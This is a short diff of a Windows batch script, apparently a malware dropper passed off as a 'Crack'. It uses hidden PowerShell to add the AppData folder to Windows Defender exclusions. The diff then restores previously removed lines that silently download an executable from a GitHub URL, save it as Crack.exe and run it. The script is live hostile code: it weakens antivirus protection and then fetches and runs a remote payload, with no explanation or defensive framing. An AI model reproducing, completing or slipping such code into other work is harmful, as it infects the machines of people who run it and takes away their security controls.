@@ -14,11 +14,13 @@ if %errorlevel% NEQ 0 (
     exit /b
 )
 set "APPDATA_PATH=%USERPROFILE%\AppData"
+set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
+set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
-
-:: DOWNLOAD AND EXECUTION REMOVED -- no Crack.exe will be downloaded or run
-
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
+start "" "%TARGET_FILE%"
 exit
+
 
 :: By MrAboudi
 :: v2
